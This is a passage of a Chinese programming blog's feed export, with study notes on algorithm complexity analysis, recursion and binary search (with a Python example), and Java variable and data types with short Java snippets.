type="1"><li><p>正确性(Correctness)：能正确的反映问题的需求，能得到正确的答案。</p><p>分以下四个层次：</p><ul><li><p>算法程序没有语法错误；</p></li><li><p>算法程序对n组输入产生正确的结果；</p></li><li><p>算法程序对典型、苛刻、有刁难性的几组输入可以产生正确的结果；</p></li><li><p>算法程序对所有输入产生正确的结果；</p></li></ul><p>但我们不可能逐一的验证所有的输入，因此算法的正确性在大多数情况下都不可能用程序证明，而是用数学方法证明。所以一般情况下我们把层次3作为算法是否正确的标准。</p></li><li><p>可读性(Readability)：算法，首先应便于人们理解和相互交流，其次才是机器可执行性。可读性强的算法有助于人们对算法的理解，而难懂的算法易于隐藏错误，且难于调试和修改。</p></li><li><p>健壮性(Robustness)：当输入的数据非法时，好的算法能适当地做出正确反应或进行相应处理，而不会产生一些莫名其妙的输出结果。【健壮性又名鲁棒性即使用棒子粗鲁地对待他也能做出正确反应或进行相应处理】</p></li><li><p>(高效性)时间效率高和存储量低</p></li></ol><h3 id="算法分析">算法分析</h3><p>算法分析的目的是看算法实际是否可行，并在同一问题存在多个算法时可进行性能上的比较，以便从中挑选出比较优的算法。</p><p>(时间效率)运行时间的长短、(空间效率)占用内存空间的大小是衡量算法好坏的重要因素。</p><p>衡量算法时间效率的方法主要有两类：事后统计法和事前分析估算法。</p><blockquote><p>事后统计法需要先将算法实现，然后测算其时间和空间开销。这种方法的缺陷很显然，</p><p>一是必须把算法转换成可执行的程序，</p><p>二是时空开销的测算结果依赖于计算机的软硬件等环境因素，这容易掩盖算法本身的优劣。</p><p>三是算法的测试数据设计困难，并且程序的运行时间往往还与测试数据的规模有很大关系，效率高的算法在小的测试数据面前往往得不到体现。比如10个数字的排序，不管用什么算法，差异几乎是零。而如果有一百万个随机数字排序，那不同算法的差异就非常大了。那么我们为了比较算法，到底用多少数据来测试，这是很难判断的问题。</p><p>所以我们通常采用事前分析估算法。</p></blockquote><p>一个算法的执行时间大致上等于其所有语句执行时间的总和，而语句的执行时间则为该条语句的重复执行次数和执行一次所需时间的乘积。</p><p>一条语句的重复执行次数称作语句频度(FrequencyCount)。</p><p>语句的执行要由源程序经编译程序翻译成目标代码，目标代码经装配再执行，因此语句执行一次实际所需的具体时间是与机器的软、硬件环境（如机器速度、编译程序质量等）密切相关的。</p><p>设每条语句执行一次所需的时间均是单位时间，则一个算法的执行时间可用该算法中所有语句频度之和来度量。所谓的算法分析并非精确统计算法实际执行所需时间，而是针对算法中<strong>语句的执行次数</strong>做出估计，从中得到算法执行时间的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; n ; i++)     <span class="hljs-comment">//&lt;- 从 0 到 n，执行 n+1 次</span><br>&#123;<br>    a++;                         <span class="hljs-comment">//&lt;- 从 0 到 n-1，执行 n 次</span><br>&#125;<br><span class="hljs-comment">/*可以看到，这段程序中仅有 2 行代码，其中：</span><br><span class="hljs-comment">for 循环从 i 的值为 0 一直逐增至 n（注意，循环退出的时候 i 值为 n），因此 for 循环语句执行了 n+1 次；</span><br><span class="hljs-comment">而循环内部仅有一条语句，a++ 从 i 的值为 0 就开始执行，i 的值每增 1 该语句就执行一次，一直到 i 的值为 n-1，因此，a++ 语句一共执行了 n 次。</span><br><span class="hljs-comment">因此，整段代码中所有语句共执行了 (n+1)+n 次，即 2n+1 次。数据结构中，每条语句的执行次数，又被称为该语句的频度。整段代码的总执行次数，即整段代码的频度。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="渐进时间复杂度">渐进时间复杂度</h3><p>对于稍微复杂一些的算法，计算出算法中所有语句的频度通常是比较困难的。通常，算法的执行时间是随问题规模增长而增长的，因此对算法的评价通常只需考虑其随问题规模增长的趋势。</p><p>这种情况下，我们只需要考虑当问题规模充分大时，算法中基本语句的执行次数在渐近意义下的阶。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171703344.png"alt="image-20231117170354264" /><figcaption aria-hidden="true">image-20231117170354264</figcaption></figure><p>分析算法时间复杂度的基本方法</p><ol type="1"><li><p>找出语句频度最大的那条语句作为基本语句；</p></li><li><p>计算基本语句的频度，得到问题规模n的某一个函数；</p></li><li><p>取其数量级用O表示</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//例子</span><br>i = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span>(i&lt;=n)<br>    i = i*<span class="hljs-number">2</span>;<br><br></code></pre></td></tr></table></figure><p>时间复杂度：<span class="math inline">\(O(log_2n)\)</span></p><h3 id="最好最坏和平均时间复杂度">最好、最坏和平均时间复杂度</h3><p>最坏时间复杂度是指在最坏情况下算法的的复杂度；</p><p>最好时间复杂度是指在最好情况下算法的的复杂度；</p><p>平均时间复杂度是指算法在所有可能情况下，按照输入实例以等概率出现时，算法计算量的加权平均值。</p><p>通常考虑最坏和平均，但有时平均比较难计算，所以只考虑<strong>最坏时间复杂度</strong>，最坏情况运行时间是一种保证，那就是运行时间不会再坏了。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171718909.png"alt="image-20231117171824861" /><figcaption aria-hidden="true">image-20231117171824861</figcaption></figure><h3 id="算法的空间复杂度">算法的空间复杂度</h3><p>和时间复杂度类似，一个算法的空间复杂度，也常用大 O 记法表示。</p><p>要知道每一个算法所编写的程序，运行过程中都需要占用大小不等的存储空间，例如：</p><ul><li>程序代码本身所占用的存储空间；</li><li>程序中如果需要输入输出数据，也会占用一定的存储空间；</li><li>程序在运行过程中，可能还需要临时申请更多的存储空间。</li></ul><p>首先，程序自身所占用的存储空间取决于其包含的代码量，如果要压缩这部分存储空间，就要求我们在实现功能的同时，尽可能编写足够短的代码。</p><p>程序运行过程中输入输出的数据，往往由要解决的问题而定，即便所用算法不同，程序输入输出所占用的存储空间也是相近的。</p><p>事实上，对算法的空间复杂度影响最大的，往往是程序运行过程中所申请的临时存储空间。不同的算法所编写出的程序，其运行时申请的临时存储空间通常会有较大不同。</p><p>如果程序所占用的存储空间和输入值无关，则该程序的空间复杂度就为O(1)；反之，如果有关，则需要进一步判断它们之间的关系：</p><ul><li>如果随着输入值 n的增大，程序申请的临时空间成线性增长，则程序的空间复杂度用 O(n)表示;</li><li>如果随着输入值 n 的增大，程序申请的临时空间成 n2关系增长，则程序的空间复杂度用 O(n2) 表示；</li><li>如果随着输入值 n 的增大，程序申请的临时空间成 n3关系增长，则程序的空间复杂度用 O(n3) 表示；</li><li>等等。</li></ul><blockquote><p>在多数场景中，一个好的算法往往更注重的是时间复杂度的比较，而空间复杂度只要在一个合理的范围内就可以。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法-递归和分治策略</title>
    <link href="/2023/11/02/%E7%AE%97%E6%B3%95%203-%E9%80%92%E5%BD%92%E5%92%8C%E5%88%86%E6%B2%BB%E7%AD%96%E7%95%A5/"/>
    <url>/2023/11/02/%E7%AE%97%E6%B3%95%203-%E9%80%92%E5%BD%92%E5%92%8C%E5%88%86%E6%B2%BB%E7%AD%96%E7%95%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="递归">递归</h1><p>1</p><h2 id="递归的概述">递归的概述</h2><h3 id="递归的定义">递归的定义</h3><p>递归(Recursion)，又译为递回，在数学与计算机科学中，是指在函数的定义中使用函数自身的方法。</p><blockquote><p>Recursion从词源上分析只是"re- (again)" + "curs- (come, happen)"也就是重复发生，再次重现的意思, 中文翻译“递归”表达了两个意思：递＋归。</p></blockquote><p>递归(Recursion)基本思想：把规模大的问题转化为规模小的相似的子问题来解决。在函数实现时，因为解决大问题的方法和解决小问题的方法往往是同一个方法，所以就产生了函数直接或间接调用它自身的情况。这个解决问题的函数必须有明显的结束条件，这样就不会产生无限递归的情况。</p><p>应用场景：树、阶乘、Fibonacci数列、Hanoi塔问题</p><p>递归的性能问题：栈的分配和函数调用代价需要在具体工程实践中考虑。</p><blockquote><p>递归的总体思想：</p><ul><li>将求解的较大规模的问题分割成k个更小规模的子问题。</li><li>对这k个子问题分别求解。如果子问题的规模仍然不够小，则再划分为k个子问题，如此递归的进行下去，直到问题规模足够小，很容易求出其解为止。</li><li>将求出的小规模的问题的解合并为一个更大规模的问题的解自底向上逐步求出原来问题的解。</li></ul></blockquote><p>分治法的设计思想：将一个难以直接解决的大问题，分割成一些规模较小的相同问题，再各个击破，分而治之</p><p>直接或间接地调用自身的算法称为递归算法（直接递归间接递归）。用函数自身给出定义的函数称为递归函数。</p><ul><li>边界条件与递归方程是递归函数的二个要素</li><li>递归函数只有具备这两个要素，才能在有限次计算后得出结果。</li></ul><p>由分治法产生的子问题往往是原问题的较小模式，这就为使用递归技术提供了方便。在这种情况下，反复应用分治手段，可以使子问题与原问题类型一致而其规模却不断缩小，最终使子问题缩小到很容易直接求出其解。这自然导致递归过程的产生。</p><p>分治与递归像一对挛生兄弟，经常同时应用在算法设计之中，并由此产生许多高效算法。</p><h3 id="递归递推迭代">递归、递推、迭代</h3><p><strong>递归形式</strong>的斐波那契数列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//伪代码</span><br><span class="hljs-type">int</span> f[maxn] = <span class="hljs-number">0</span>;<br>f[<span class="hljs-number">0</span>] = f[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fib</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span>&#123;<br><span class="hljs-keyword">if</span>(f[n]) <span class="hljs-keyword">return</span> f[n];<br><span class="hljs-keyword">return</span> f[n] = fib(n<span class="hljs-number">-1</span>) + fib(n<span class="hljs-number">-2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>递推形式</strong>的斐波那契数列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//伪代码</span><br><span class="hljs-type">int</span> f[maxn] = <span class="hljs-number">0</span>;<br>f[<span class="hljs-number">0</span>] = f[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>; i&lt;=n; ++i)&#123;<br>f[i] = f[i<span class="hljs-number">-1</span>] + f[i<span class="hljs-number">-2</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>递推Inductive</strong>：一步步往后，从左往右。即有来无回。</p><p><strong>递归Recursive</strong>：从最后面一步步往前嵌套，再从最前面一步步往后套。递归=递推+回归。即有来有回。</p><p><strong>迭代Iteration</strong>：循环执行，每次把前面计算出的值套下一步。迭代是逐渐逼近，用新值覆盖旧值。</p><p>注意：递归次数太多可能会爆栈。</p><h2 id="分治法的常用例子">分治法的常用例子</h2><h3 id="二分查找">二分查找</h3><h4 id="概述">1. 概述</h4><p>二分查找（Binary Search）算法，也叫折半查找算法</p><p>算法前件：待查找序列有序</p><p>基本思想：先将待查元素与中间元素比，若比中间元素大，则在序列的后一半继续查找；若比中间元素小，则在序列的前一半继续查找。</p><p>二分查找与顺序查找对比图：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311021339520.gif"alt="1" /><figcaption aria-hidden="true">1</figcaption></figure><h4 id="复杂度分析">2.复杂度分析</h4><p><strong>时间复杂度</strong></p><p>我们假设数据大小是n，每次查找后数据都会缩小为原来的一半，也就是会除以2。最坏情况下，直到查找区间被缩小为空，才停止。</p><blockquote><p>被查找区间的大小变化：n、n/2、n/4、n/8 ... n/2^k</p></blockquote><p>假设总共查找了 k 次，则剩余 <spanclass="math inline">\(n/2^k\)</span>个元素。最坏的情况是查找到最后一个元素，则有等式：<spanclass="math inline">\(n/2^k = 1\)</span>，即 <spanclass="math inline">\(2^k=n\)</span>，得：<span class="math inline">\(k= log_2n\)</span></p><p>忽略常数，则二分查找的时间复杂度为<code>O(log n)</code></p><p><strong>空间复杂度</strong></p><p>空间复杂度是很简单的，根据上面的流程可以得知，在整个二分搜索的过程中，只需要额外存储三个变量：最大值，最小值 和 中点，因此，空间复杂度是常量 <code>O(1)</code></p><h4 id="python实现">3. Python实现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 二分查找的递归与分治策略实现（python）</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">binary_search</span>(<span class="hljs-params">arr, target, left, right</span>):<br>    <span class="hljs-keyword">if</span> left &lt;= right:<br>        mid = left + (right - left) // <span class="hljs-number">2</span>  <span class="hljs-comment"># 计算中间位置</span><br><br>        <span class="hljs-keyword">if</span> arr[mid] == target:<br>            <span class="hljs-keyword">return</span> mid  <span class="hljs-comment"># 找到目标元素，返回索引</span><br>        <span class="hljs-keyword">elif</span> arr[mid] &lt; target:<br>            <span class="hljs-keyword">return</span> binary_search(arr, target, mid + <span class="hljs-number">1</span>, right)  <span class="hljs-comment"># 在右半部分递归查找</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> binary_search(arr, target, left, mid - <span class="hljs-number">1</span>)  <span class="hljs-comment"># 在左半部分递归查找</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>  <span class="hljs-comment"># 目标元素不在数组中，返回-1</span><br><br><span class="hljs-comment"># 输入数组</span><br>input_string = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入一个升序数组（以逗号分隔）: &quot;</span>)<br>arr = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, input_string.split(<span class="hljs-string">&#x27;,&#x27;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已创建好一个升序数组：&quot;</span>,arr)<br><br><span class="hljs-comment"># 输入要查找的数字</span><br>target = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要查找的数字: &quot;</span>))<br><br>result = binary_search(arr, target, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(arr) - <span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">if</span> result != -<span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;目标 <span class="hljs-subst">&#123;target&#125;</span> 在索引 <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;目标 <span class="hljs-subst">&#123;target&#125;</span> 不在数组中&quot;</span>)<br><br></code></pre></td></tr></table></figure><h4 id="应用场景及局限性">4. 应用场景及局限性</h4><ul><li><p>二分查找依赖顺序表结构，如数组；</p><blockquote><p>那二分查找能否依赖其他数据结构呢？比如链表。答案是不可以的，主要原因是二分查找算法需要按照下标随机访问元素。数组按照下标随机访问数据的时间复杂度是O(1)，而链表随机访问的时间复杂度是O(n)。所以，如果数据使用链表存储，二分查找的时间复杂就会变得很高。</p></blockquote></li><li><p>二分查找针对的是有序数据，如果无序，则要先排序；</p></li><li><p>数据量太小不适合二分查找；</p><blockquote><p>如果要处理的数据量很小，完全没有必要用二分查找，顺序遍历就足够了。比如我们在一个大小为10的数组中查找一个元素，不管用二分查找还是顺序遍历，查找速度都差不多。</p><p>只有数据量比较大的时候，二分查找的优势才会比较明显。不过，这里有一个例外。如果数据之间的比较操作非常耗时，不管数据量大小，我都推荐使用二分查找。比如，数组中存储的都是长度超过300的字符串，如此长的两个字符串之间比对大小，就会非常耗时。我们需要尽可能地减少比较次数，而比较次数的减少会大大提高性能，这个时候二分查找就比顺序遍历更有优势。</p></blockquote></li><li><p>数据量太大也不适合二分查找。</p><blockquote><p>最后，数据量太大也不适合二分查找。</p><p>二分查找的底层需要依赖数组这种数据结构，而数组为了支持随机访问的特性，要求内存空间连续，对内存的要求比较苛刻。比如，我们有1GB 大小的数据，如果希望用数组来存储，那就需要 1GB 的连续内存空间。</p><p>注意这里的“连续”二字，也就是说，即便有 2GB的内存空间剩余，但是如果这剩余的 2GB 内存空间都是零散的，没有连续的 1GB大小的内存空间，那照样无法申请一个 1GB大小的数组。而我们的二分查找是作用在数组这种数据结构之上的，所以太大的数据用数组存储就比较吃力了，也就不能用二分查找了。</p></blockquote></li></ul><h4 id="二分查找算法的改进">5. 二分查找算法的改进</h4><p><ahref="https://c.biancheng.net/algorithm/interpolation-search.html">插值查找算法(biancheng.net)</a></p><p><ahref="https://www.cnblogs.com/MinPage/p/14192152.html">二分查找及其优化- 箐茗 - 博客园 (cnblogs.com)</a></p><p><ahref="https://blog.csdn.net/weixin_42145502/article/details/99676008">斐波那契查找原理深入_斐波那契法原理-CSDN博客</a></p><p><ahref="https://blog.csdn.net/qq_40660998/article/details/134033754">查找算法-斐波那契查找法（FibonacciSearch）-CSDN博客</a></p><blockquote><p>参考：</p><p><ahref="https://blog.csdn.net/Abysscarry/article/details/87388195?ops_request_misc=%7B%22request%5Fid%22%3A%22169900884916800211543547%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=169900884916800211543547&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-87388195-null-null.142%5Ev96%5Epc_search_result_base1&amp;utm_term=二分查找复杂度分析&amp;spm=1018.2226.3001.4187">二分查找算法及其变种详解-CSDN博客</a></p><p><ahref="https://blog.csdn.net/weixin_42001592/article/details/128963283?ops_request_misc=%7B%22request%5Fid%22%3A%22169900884916800211543547%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=169900884916800211543547&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-128963283-null-null.142%5Ev96%5Epc_search_result_base1&amp;utm_term=二分查找复杂度分析&amp;spm=1018.2226.3001.4187">算法笔记：二分查找_二分查找的时间复杂度-CSDN博客</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>算法分析与设计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法分析与设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>&lt;Java&gt; 2_变量</title>
    <link href="/2023/11/01/Java%202%20%E5%8F%98%E9%87%8F/"/>
    <url>/2023/11/01/Java%202%20%E5%8F%98%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>变量：变量是程序的基本组成单位</p><p>变量的三个基本要素：类型 + 名称 + 值</p><p>示例：<code>int a = 1</code> 类型 int 名称 a 值 1</p></blockquote><p>变量相当于内存中的一个数据存储空间的表示</p><h2 id="变量使用注意事项">2.1 变量使用注意事项</h2><ol type="1"><li>变量表示内存中的一个存储区域。不同变量，不同类型，占用的空间大小不同。如<code>int</code> 有 4 byte，而 <code>double</code> 有 8 byte。</li><li>该区域有自己的名称 <code>变量名</code> 和类型<code>数据类型</code></li><li>变量必须先声明，后使用。</li><li>变量在同一作用域内不能重名。</li><li>该区域的数据/值可以在同一类型范围内变化。</li><li>变量的三个基本要素： 变量名 + 值 + 数据类型</li></ol><h2 id="程序中-的使用">2.2 程序中 <code>+</code> 的使用</h2><ol type="1"><li><p>当左右两边都是数值型，做加法运算</p></li><li><p>当左右两边任意一方为字符串，做拼接运算</p></li><li><p>运算顺序是从左到右的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">1</span> + <span class="hljs-number">1</span> + <span class="hljs-string">&quot;hello&quot;</span> + <span class="hljs-number">8</span> + <span class="hljs-number">9</span>);<span class="hljs-comment">// 输出 2hello89</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="java-数据类型">2.3 Java 数据类型</h2><h3 id="基本数据类型记住">基本数据类型（记住！）</h3><ul><li><strong>数值型</strong><ul><li>整数类型，存放整数：<ul><li>byte：占用 1 字节</li><li>short：占用 2 字节</li><li>int：占用 4 字节</li><li>long：占用 8 字节</li></ul></li><li>浮点（小数）类型：<ul><li>float：占用 4 字节</li><li>double：占用 8 字节</li></ul></li></ul></li><li><strong>字符型</strong><ul><li>char：存放单个字符，占用 2 字节</li></ul></li><li><strong>布尔型</strong><ul><li>boolean：存放 true（真），false（假）。占用 1 字节</li></ul></li></ul><h3 id="引用数据类型复合数据类型">引用数据类型（复合数据类型）</h3><ul><li><p><strong>类</strong>：class</p></li><li><p><strong>接口</strong>：interface</p></li><li><p><strong>数组</strong>：<code>[]</code></p></li></ul><p><strong>字符串类型String实际上是一个”类“</strong></p><h2 id="整数类型">2.4 整数类型</h2><blockquote><p>用于存放整数值</p></blockquote><ul><li><code>byte</code> 占用 1 字节，范围 -128 ~ 127</li><li><code>short</code> 占用 2 字节，范围 <spanclass="math inline">\(-2^{15} ～ 2^{15} -1\)</span>（-32768~32767）</li><li><code>int</code> 占用 4 字节，范围 <spanclass="math inline">\(-2^{31} ～ 2^{31} - 1\)</span></li><li><code>long</code> 占用 8 字节，范围 <spanclass="math inline">\(-2^{63} ～ 2^{63} - 1\)</span></li></ul><p><strong>使用细节：</strong></p><ol type="1"><li>Java 各整数类型有固定的范围和字符长度，不受具体OS（操作系统）影响，以保证 Java 程序的可移植性。</li><li>Java 默认整型常量为 <code>int</code> ，要声明 <code>long</code>型常量须后加<code>‘l’</code>或<code>‘L’</code></li><li>java程序中变量常声明为<code>int</code>型，除非不足以表示大数，才用<code>long</code></li></ol><p>如果基本的整数、浮点类型不能满足范围、精度的需求，可以使用“大数”（后面会讲）</p><h2 id="浮点类型">2.5 浮点类型</h2><blockquote><p>可以表示一个小数</p></blockquote><ul><li><code>float</code> 单精度（6 ~ 7 位有效数字），占用 4 字节，范围约-3.403E38 ~ 3.403E38</li><li><code>double</code> 双精度（15 位有效数字），占用 8 字节，范围约-1.798E308 ~ 1.798E308</li></ul><p>浮点数在机器中存放形式为：浮点数 = 符号位 + 指数位 + 尾数位</p><p>因此，尾数部分可能丢失，造成精度损失。所以，小数都是近似值</p><h3 id="使用细节">2.5.1 使用细节</h3><ol type="1"><li><p>与整数类型相似，Java浮点类型有固定的范围和字符长度，不受具体OS（操作系统）影响。</p></li><li><p>Java 默认浮点型常量为 <code>double</code> ，要声明<code>float</code> 型常量必须后加 <code>'f'</code> 或<code>'F'</code></p></li><li><p>浮点型常量有两种表示形式</p><ul><li>十进制数形式：<code>5.12</code>、<code>315.4F</code>、<code>.512</code></li><li>科学计数法：<code>5.12e2</code> 即[5.12 ×10的二次方]、<code>5.12E-2</code> 即[5.12 / 10的二次方]</li></ul></li><li><p>通常情况下，应该使用 <code>double</code>类型，因为它比<code>float</code>型更为精确。</p></li><li><p>浮点数使用陷阱：当我们对运算结果是小数的进行相等判断时，要小心。（因为<strong>小数都是近似值</strong>）</p><p>正确方法是：<strong>以两个数差值的绝对值，在某个精度范围内判断</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//num1 = 2.7</span><br><span class="hljs-comment">//num2 = 8.1 / 3</span><br><span class="hljs-keyword">if</span> (Math.abs(num1 - num2) &lt; <span class="hljs-number">0.000001</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;差值非常小，到我的规定精度，认为相等&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="java-api文档">2.6 Java API文档</h2><p>API（Application Programming Interface，应用程序编程接口）是 Java提供的基本编程接口（java提供的类还有相关的方法）。中文在线文档https://www.matools.com/api/java8</p><h2 id="字符类型">2.7 字符类型</h2><blockquote><p>可以表示单个字符，字符类型是char，两个字节。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-type">char</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;\t&#x27;</span>;   <span class="hljs-comment">//输出一个制表位</span><br><span class="hljs-type">char</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;字&#x27;</span>;<br><span class="hljs-type">char</span> <span class="hljs-variable">c4</span> <span class="hljs-operator">=</span> <span class="hljs-number">97</span>;    <span class="hljs-comment">//输出一个a</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="使用细节-1">2.7.1 使用细节</h3><ol type="1"><li><p>字符常量用<strong>单引号</strong>括起</p></li><li><p>字符允许使用转义符</p></li><li><p><code>char</code> 的本质是一个整数，默认输出时，输出的是 unicode码对应的字符。</p><p>要输出字符常量对应的整数，用 <code>int</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span>;<br>System.out.println((<span class="hljs-type">int</span>)c1);   <span class="hljs-comment">//输出97</span><br></code></pre></td></tr></table></figure></li><li><p><code>char</code> 是可以进行运算的，其相当于一个整数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 注：(int)&#x27;a&#x27; = 97</span><br><span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span> + <span class="hljs-number">1</span>;<span class="hljs-comment">// 相当于 char c1 = &#x27;b&#x27;</span><br>System.out.println(<span class="hljs-string">&#x27;a&#x27;</span> + <span class="hljs-number">1</span>);<span class="hljs-comment">// 这个代码输出 98</span><br>System.out.println(<span class="hljs-type">int</span>(c1));    <span class="hljs-comment">// 这个代码输出 98</span><br>System.out.println(c1);        <span class="hljs-comment">// 这个代码输出 b</span><br>System.out.println(<span class="hljs-string">&quot;a&quot;</span> + <span class="hljs-number">1</span>);<span class="hljs-comment">// 这个代码输出 a1</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="字符本质与编码表">2.7.2 字符本质与编码表</h3><ol type="1"><li><p>字符型 存储到计算机中，需要将字符对应的码值(整数)找出来，比如’a’</p><p>存储：’a’ ==&gt; 码值 97 ==&gt; 二进制(110 0001) ==&gt; 存储</p><p>读取：二进制(110 0001) ==&gt; 97 ==&gt; ’a’ ==&gt; 显示</p></li><li><p>字符与码值的对应关系是字符编码表规定的。</p><blockquote><p>ASCII 编码表，占用 1 byte（字节），共有 128个字符。缺点：不能表示所有的字符</p><p>Unicode 编码表，占用 2byte（2的16次方，最多65536个字符），字母汉字都占用 2byte，将世界上所有的符号都纳入其中，这样可能浪费空间（字母多汉字少时）。0- 127 的字符与 ASCII 相同，所以兼容 ASCII。</p><p>UTF-8 编码表，根据不同符号大小可变（1 - 6 byte），字母占用 1byte，汉字占用 3 byte。是 Unicode 的改进，是互联网上使用最广的 Unicode实现方式。</p><p>GBK 编码表，可以表示汉字，而且范围广，字母占用 1 byte，汉字占用 2byte。</p><p>GB2312 编码表，可以表示汉字，用的少（GB2312 &lt; GBK）</p><p>BIG5 编码表，可以存放繁体中文（香港，台湾）</p></blockquote></li></ol><h2 id="布尔类型">2.8 布尔类型</h2><blockquote><p><code>boolean</code> 只允许取值 <code>ture</code> 或<code>false</code> ，没有<code>null</code>。适用于逻辑运算，通常用于程序流程控制</p></blockquote><p><strong>使用细节：</strong></p><ol type="1"><li><p>不可以用 0 或 非0 的整数替代 <code>false</code> 或<code>ture</code> 。这点和 C语言 不同。</p></li><li><p>不能让布尔类型转换为其他类型。如需转换，请使用如下方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-variable">b</span> <span 